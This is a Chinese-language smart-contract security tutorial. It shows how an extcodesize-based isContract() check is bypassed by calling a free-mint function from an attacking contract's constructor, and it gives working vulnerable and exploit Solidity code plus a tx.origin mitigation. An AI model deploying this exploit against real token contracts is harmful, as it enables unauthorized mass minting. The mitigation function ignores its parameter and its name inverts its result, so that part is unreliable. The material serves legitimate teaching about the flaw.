---
title: 绕过智能合约检测
displayed_sidebar: generalSidebar
---

许多免费铸造的项目使用 `isContract()` 方法限制对外部账户（EOAs）的访问以及限制智能合约的交互。 此方法使用 `extcodesize` 来决定地址运行时 `bytecode` 长度。 如果大于零，则被视为智能合约；否则，它被视为EOA。

```solidity
    // Using extcodesize to check if an address is a contract
    function checkContract(address account) public view returns (bool) {
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
```

然而，由于在智能合约创建期间，运行时`bytecode`尚未存储在地址上，所以`bytecode`的长度为零，所以存在潜在的漏洞。 如果我们将逻辑存放在构造器中，我们可以借此绕过`isContract()`检查。

**利用漏洞的示例**

在下面的例子中，`FreemintERC20`合同使用`checkContract()`函数来防止智能合约执行它的`mintTokens()`函数，以防止自动大量铸造。 每次调用`mintTokens()`都会铸造100个通证。

```solidity
// Using extcodesize to check if an address is a contract
contract FreemintERC20 is ERC20 {
    constructor() ERC20("Token", "TKN") {}

    function checkContract(address account) public view returns (bool) {
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    // mint function can only be called by non-contract addresses (vulnerable)
    function mintTokens() public {
        require(!checkContract(msg.sender), "Contracts are not allowed!");
        _mint(msg.sender, 100);
    }
}
```

我们创建一个智能合约用于攻击，并在构造器中多次调用`mintTokens()`代码：

```solidity
// Exploiting constructor characteristics for attacks
contract AttackContract {
    bool public detectedAsContract;
    address public targetContract;

    // During contract creation, extcodesize is 0, thus bypassing isContract() checks.
    constructor(address addr) {
        targetContract = addr;
        detectedAsContract = FreemintERC20(addr).checkContract(address(this));
        for(uint i; i < 10; i++){
            FreemintERC20(addr).mintTokens();
        }
    }

    // After contract deployment, extcodesize > 0, isContract() will detect
    function tryMint() external {
        FreemintERC20(targetContract).mintTokens();
    }
}
```

在这个智能合约中，通过调用构造函数中的`mintTokens()`方法可以绕过`isContract()`检查，并铸造通证。 状态变量 `detectedAsContract` 在构造器中将被设置为`false`。 部署后，`runtime bytecode` 存储在智能合约中，并且 `extdesize > 0` , 因此当调用 `mintTokens()`时，`checkContract()` 会成功地阻止铸造。

**预防措施**

我们可以使用 `(tx.origin == msg.sender)` 来确定调用者是否是智能合约。 如果调用者是EOA，那么`tx.origin`和`msg.sender`将是相等的；如果他们不相等，则调用者是智能合约。

```solidity
function realContractCheck(address account) public view returns (bool) {
    return (tx.origin == msg.sender);
}
```
